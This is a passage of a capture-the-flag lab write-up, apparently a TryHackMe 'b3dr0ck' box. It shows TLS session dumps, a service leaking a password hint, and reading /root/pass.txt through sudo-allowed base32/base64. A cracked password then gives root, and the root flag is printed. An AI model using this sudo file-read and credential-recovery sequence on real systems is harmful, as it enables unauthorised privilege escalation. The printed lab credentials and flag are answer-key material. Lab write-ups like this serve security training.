    0060 - ef 9f 71 33 46 fb cb f7-1c 7f 20 0e 44 40 13 e9   ..q3F..... .D@..
    0070 - 66 9f a9 3d ab 4f 87 2c-5c 56 36 c2 0d af b3 a3   f..=.O.,\V6.....
    0080 - a2 75 ee b0 f3 ca 0c 8a-20 5e cd 8e a6 a3 01 7a   .u...... ^.....z
    0090 - c8 f4 aa 07 90 b3 3f a0-0b 4b 84 24 80 69 bb 5b   ......?..K.$.i.[
    00a0 - 29 f8 81 02 e2 7e bf 82-82 81 ba fe 09 a5 5f 72   )....~........_r
    00b0 - 48 fd d1 6f 37 50 f3 a1-8e f5 40 b5 67 b0 44 53   H..o7P....@.g.DS
    00c0 - 42 9a b0 6e 90 31 ab dd-1d 9b 93 8a 18 64 10 17   B..n.1.......d..
    00d0 - 8c 00 b5 47 3e 95 39 c1-b8 0a ad 6b 84 b8 73 fa   ...G>.9....k..s.
    00e0 - 0a d4 b5 27 78 8f 9e de-ac 23 08 ad 08 54 40 ad   ...'x....#...T@.
    00f0 - 0b 0c 0b b4 74 96 6b 27-77 b1 08 0b f5 a2 71 27   ....t.k'w.....q'
    0100 - cc ac 65 4c 5a 61 b2 75-30 c8 4d 15 3a 4a c6 7f   ..eLZa.u0.M.:J..
    0110 - 8a 68 0c 68 81 7c c0 3b-5b da 92 da ec 8c f8 a7   .h.h.|.;[.......
    0120 - fb 72 c9 d4 97 02 49 4d-72 00 72 05 d7 5e 21 f5   .r....IMr.r..^!.
    0130 - 0f 7f 77 de c1 fa 4e 31-24 f9 91 9a 3d c1 56 af   ..w...N1$...=.V.
    0140 - 29 a9 fc 14 e3 c0 d0 b9-5a 3d d6 3c f5 13 9d 51   ).......Z=.<...Q
    0150 - 06 b6 21 21 ac f8 9e e7-2a 02 4f 26 98 1e 11 73   ..!!....*.O&...s
    0160 - 80 ef 8e 74 7b 64 58 52-70 19 d4 d7 a8 3e 55 86   ...t{dXRp....>U.
    0170 - 07 05 77 e5 c5 a4 b2 60-22 b2 4d dd cd d3 13 af   ..w....`".M.....
    0180 - 74 8b 00 68 33 4f 73 1c-71 46 89 8b 4a 73 eb d0   t..h3Os.qF..Js..
    0190 - e9 16 06 e4 de 4e 3b 40-2b 51 10 ef c9 62 8d 18   .....N;@+Q...b..
    01a0 - 61 3e 22 72 83 ac 3f 89-21 8d 23 10 3b 55 64 33   a>"r..?.!.#.;Ud3
    01b0 - 36 0a cb 1b 96 a5 07 d1-61 d2 8b 78 ef 14 01 96   6.......a..x....
    01c0 - 59 cd cf de 5e 53 55 b3-0e 49 e0 04 27 a2 b6 86   Y...^SU..I..'...
    01d0 - 1a 76 61 95 71 22 90 95-7c 4e 6f 13 1c b5 a5 38   .va.q"..|No....8
    01e0 - 7c 08 29 18 87 10 e2 d6-1c 91 dc 95 34 0b b7 70   |.).........4..p
    01f0 - 73 70 db f0 62 53 bb d7-1b a0 c3 90 0a e5 db 63   sp..bS.........c
    0200 - 7f 38 a0 20 c3 bd fe be-69 df e2 91 10 bc 77 12   .8. ....i.....w.
    0210 - ca 10 3e 92 3f 8f 6c 08-29 be 95 90 b6 3a c0 2b   ..>.?.l.)....:.+
    0220 - 25 6a f9 70 eb 74 ad 14-2f 82 af ae 3c dd 1d 87   %j.p.t../...<...
    0230 - a3 cb 8a 11 53 a0 91 71-1c d4 cc 0e a5 f5 72 ce   ....S..q......r.
    0240 - 4c bd f9 68 be 85 62 27-2b 57 ae ee e3 dd ee ee   L..h..b'+W......
    0250 - a7 a7 8c 74 17 e8 03 04-ea e0 07 a2 79 a3 0b 0f   ...t........y...
    0260 - be 0d d3 f2 4f 07 65 23-67 d0 ff 9d 34 b4 3c 4c   ....O.e#g...4.<L
    0270 - b5 fb 26 ad ec 13 7f 4b-b4 03 91 3d 07 96 b8 36   ..&....K...=...6
    0280 - 31 7f c7 9d 61 8a 4c 1b-e8 04 63 2c ce e4 07 a2   1...a.L...c,....
    0290 - bb 77 9e 73 a3 ed 3b a1-ca 0b e9 de b4 3b 54 64   .w.s..;......;Td
    02a0 - 7e 26 6d 5d a6 ea 87 c0-88 40 0c 44 bd c3 7e a9   ~&m].....@.D..~.
    02b0 - bd 01 45 13 30 a7 e0 78-6c f0 86 5d 8b 3b 7e 4f   ..E.0..xl..].;~O
    02c0 - c0 d5 75 b4 4d 31 79 32-fb c0 c4 73 ba 32 b9 b2   ..u.M1y2...s.2..
    02d0 - 07 e9 0c ba 10 e7 ea 85-64 b0 5c ac e5 07 71 61   ........d.\...qa
    02e0 - 30 e4 06 0f d0 79 61 04-c5 dc 8a ba 1e b2 af 24   0....ya........$
    02f0 - 8f 85 cd 32 56 ca 31 bf-f2 af 47 d1 63 89 93 8b   ...2V.1...G.c...
    0300 - dd e9 4d a7 7b 45 55 2c-74 e0 9e bd 7d be bd 97   ..M.{EU,t...}...
    0310 - 8f d6 8c 31 ca a2 0a 7c-8a ad 97 5a 94 22 96 e2   ...1...|...Z."..
    0320 - 7a fe e3 bd 59 03 ea f3-d6 19 6e bc e9 e8 76 99   z...Y.....n...v.
    0330 - 1b 07 4a 13 b6 6b b1 24-99 62 39 77 4f 7b 57 ec   ..J..k.$.b9wO{W.
    0340 - 4e 73 9b 56 86 e9 f5 57-d8 9e 15 55 02 7c 88 8c   Ns.V...W...U.|..
    0350 - 9d f0 77 7b 7e e0 17 ae-ba 01 b2 ac 9b b1 50 27   ..w{~.........P'
    0360 - 29 93 57 65 e5 16 fe df-be fd 4a 7c e6 7f 1a 4d   ).We......J|...M
    0370 - f4 6e eb 57 1e 39 a0 58-9b 61 8d e5 96 b2 01 3e   .n.W.9.X.a.....>
    0380 - 81 04 d6 57 96 80 88 3c-67 d7 26 8b 06 f3 1e d6   ...W...<g.&.....

    Start Time: 1781181667
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 792A16158AEB6B5562EA90B74E37C950B90E2C12662266AB1FE2BD3325309605
    Session-ID-ctx: 
    Resumption PSK: 9140A1C14618F477B31FC63EA6FE55B8DC1D5979C09FCC2828154491A539BAFBADCD921377D4D1171C98EF5CE3B7FC8D
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 63 a7 f8 bc 76 05 b5 7c-bf 5a 34 e2 f9 4c b9 42   c...v..|.Z4..L.B
    0010 - dd 25 ff ed 1e ab e1 7e-ac f6 56 0c 47 29 2a 5c   .%.....~..V.G)*\
    0020 - 22 8b a0 b3 07 4b c7 05-4b c8 48 2a 5e 25 21 7b   "....K..K.H*^%!{
    0030 - 02 6f 0c 4b 65 38 57 1e-85 e8 08 9d d7 fb 40 f4   .o.Ke8W.......@.
    0040 - b3 a1 ec 83 8e e9 66 15-71 38 36 25 9f c4 ea dc   ......f.q86%....
    0050 - ca b8 74 ef 86 d2 07 25-d0 a1 87 6e e1 d9 60 ea   ..t....%...n..`.
    0060 - 44 ad 69 3d ef 23 88 b9-83 2c 34 d6 4a 0b 4a 5e   D.i=.#...,4.J.J^
    0070 - 3c e0 1c 70 35 56 8b 13-6a 05 cc 1d 6a ce 08 e4   <..p5V..j...j...
    0080 - e7 15 c8 d9 b8 40 98 84-15 19 6c 9d cd e8 2d 10   .....@....l...-.
    0090 - 20 38 ac b4 97 ad 20 9e-e6 b9 5e 36 70 3d 64 cd    8.... ...^6p=d.
    00a0 - ea 03 ef 16 ae 98 ee f2-12 28 19 fe d7 29 b5 28   .........(...).(
    00b0 - ff a0 1f fa 7e 73 5e 3e-ae 15 b9 e9 a4 a4 d3 66   ....~s^>.......f
    00c0 - a7 bb 23 a5 88 6f 12 48-58 8c cd 88 b1 9a 13 83   ..#..o.HX.......
    00d0 - 6e ff 89 91 31 fb ba 90-f5 3f 7a ab a0 73 e7 a9   n...1....?z..s..
    00e0 - 9f af b6 9f ab 75 3d 35-d5 bd 0e 91 ef 3f 04 b4   .....u=5.....?..
    00f0 - 17 0e af 40 7e 21 a8 dd-51 5f 87 58 fa 46 be 8d   ...@~!..Q_.X.F..
    0100 - 74 9c 32 8f e0 fb c0 0a-72 33 9e bf 81 c6 1c 9a   t.2.....r3......
    0110 - c0 e6 0a 94 63 27 cf 17-f4 37 c8 9c 59 d5 1c c2   ....c'...7..Y...
    0120 - 02 28 b4 08 ed 7d c2 b6-be e7 61 fd fc 4b dd 58   .(...}....a..K.X
    0130 - 96 5e 9c c5 9a 34 fe c4-d1 5b 6a 20 16 24 46 a7   .^...4...[j .$F.
    0140 - 33 dc eb 5a 1b 89 52 37-bd f2 8b 98 b5 97 5c 1a   3..Z..R7......\.
    0150 - af ce 49 2d d8 0b a0 4c-10 e3 5c 05 a5 79 4d 14   ..I-...L..\..yM.
    0160 - ec ad f1 13 f6 3f 06 72-bc d6 1f eb 41 4a 1c 3f   .....?.r....AJ.?
    0170 - 99 54 30 89 e0 49 fa 46-5a d0 6f b8 b1 f1 a0 2a   .T0..I.FZ.o....*
    0180 - ee 96 76 58 3c 36 58 30-91 2b 2b aa 7b 21 4e e5   ..vX<6X0.++.{!N.
    0190 - 1f 14 fc a9 4a 5a dc 68-6d ec ad 1a 86 f2 9d 19   ....JZ.hm.......
    01a0 - 8a f7 04 49 57 6b 9e 8a-2a 9a 78 fa 00 ff 11 1b   ...IWk..*.x.....
    01b0 - 37 2d e6 1e f1 aa dd 61-50 c2 48 9f 84 17 e0 ae   7-.....aP.H.....
    01c0 - 2c f3 6e 27 71 8f 4c 07-e8 26 24 a5 6e fb 74 f3   ,.n'q.L..&$.n.t.
    01d0 - 03 55 82 dc 84 2d 61 02-9b 12 a6 41 17 d1 75 7b   .U...-a....A..u{
    01e0 - 78 98 52 b9 33 d1 71 93-64 66 5a d7 25 a2 68 50   x.R.3.q.dfZ.%.hP
    01f0 - 63 39 e7 21 36 24 98 2a-b6 ea 94 63 06 88 e1 57   c9.!6$.*...c...W
    0200 - f7 8c b7 f1 b3 fb 70 0d-68 cb b1 6d 9a a9 76 0e   ......p.h..m..v.
    0210 - 51 dc bd b9 d3 99 32 47-c7 03 01 88 1a 42 0b 52   Q.....2G.....B.R
    0220 - a7 c3 15 23 58 16 80 10-7e 9c ab 23 05 d2 dc 06   ...#X...~..#....
    0230 - 7d 92 b6 2c 68 95 cf e4-d0 51 54 02 4f 6e f6 fb   }..,h....QT.On..
    0240 - fe 17 4a f7 df 13 9a 57-5b 4f 0d 47 ea 97 1e 56   ..J....W[O.G...V
    0250 - 3d 8e c9 70 c3 9a 52 4f-12 95 bc a8 68 2c 36 08   =..p..RO....h,6.
    0260 - a7 a3 cc d6 bb 4f 0e fb-fb 3c e3 50 d7 5b d0 d2   .....O...<.P.[..
    0270 - 98 d9 be c0 6c c8 ee 2f-e4 b9 7a a8 f4 9d aa d0   ....l../..z.....
    0280 - b9 be c2 e5 6a e7 f4 e6-2f be 16 71 9f fb 26 af   ....j.../..q..&.
    0290 - f4 84 2a 8e d1 00 85 d0-37 2a 7d 17 01 ee af 06   ..*.....7*}.....
    02a0 - 46 4f f0 92 c0 0a 88 c7-0a 25 ac b3 f3 ed 71 cf   FO.......%....q.
    02b0 - 71 d6 ac d8 22 48 5a 88-87 c8 d2 7a d8 82 9f af   q..."HZ....z....
    02c0 - 63 3b e4 5b 68 9c da f9-fe b9 a8 da bb 00 8a 3d   c;.[h..........=
    02d0 - b2 8b d4 ef b2 da e4 9c-06 7e 8c b6 d9 95 ef 44   .........~.....D
    02e0 - 79 c3 39 7c 60 a8 ab 0d-0e 94 41 2b 08 25 0d 6b   y.9|`.....A+.%.k
    02f0 - 41 d4 69 f2 76 0f ed f8-78 d2 a9 24 b2 dd 73 6e   A.i.v...x..$..sn
    0300 - 54 a3 65 5c 26 a7 9d 6d-96 76 cb 5f f3 db 2c 96   T.e\&..m.v._..,.
    0310 - 5b 8e 6a da 41 cd 02 5f-aa 87 97 d8 94 29 bb ca   [.j.A.._.....)..
    0320 - 5f 6c cf 5d 5f ba ab 89-6b a0 7b 44 f5 fe f3 ff   _l.]_...k.{D....
    0330 - 35 cb 27 b3 96 f0 85 80-0a d8 0e de f4 68 16 a8   5.'..........h..
    0340 - 76 ee ae bd 66 4d 1a 8f-a9 35 54 35 12 1f 96 db   v...fM...5T5....
    0350 - 55 6c 90 00 16 ca 93 a1-b6 4c 99 a3 97 d8 0a 07   Ul.......L......
    0360 - 74 31 28 37 f7 99 c0 22-a5 9f 60 cd c2 e7 71 a7   t1(7..."..`...q.
    0370 - 38 71 19 cf c5 5b 11 81-8e 88 27 6c ff 2f f3 8b   8q...[....'l./..
    0380 - 1b 53 86 81 cf 6a ee c8-01 b3 a7 2f 5b 82 0f cf   .S...j...../[...

    Start Time: 1781181667
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
Welcome: 'Fred Flintston' is authorized.
b3dr0ck> password
Password hint: YabbaDabbaD0000! (user = 'Fred Flintston')
b3dr0ck> 

```


```
fred@ip-10-48-129-249:~$ sudo /usr/bin/base32 /root/pass.txt
JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
fred@ip-10-48-129-249:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
fred@ip-10-48-129-249:~$ 

```

***crack the hash***

```
flintstonesvitamins
```

```
fred@ip-10-48-129-249:~$ flintstonesvitamins
flintstonesvitamins: command not found
fred@ip-10-48-129-249:~$ sudo root
[sudo] password for fred: 
Have a gorilla...
[sudo] password for fred: 
You do that again and see what happens...
[sudo] password for fred: 
sudo: 3 incorrect password attempts
fred@ip-10-48-129-249:~$ su root
Password: 
root@ip-10-48-129-249:/home/fred# ls
fred.txt
root@ip-10-48-129-249:/home/fred# pwd
/home/fred
root@ip-10-48-129-249:/home/fred# cd ..
root@ip-10-48-129-249:/home# ls
barney  fred  ssm-user  ubuntu
root@ip-10-48-129-249:/home# cd ..
root@ip-10-48-129-249:/# ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var
root@ip-10-48-129-249:/# cd root
root@ip-10-48-129-249:~# ls
pass.txt  root.txt  snap
root@ip-10-48-129-249:~# cat  root.txt
THM{de4043c009214b56279982bf10a661b7}
root@ip-10-48-129-249:~# 

```



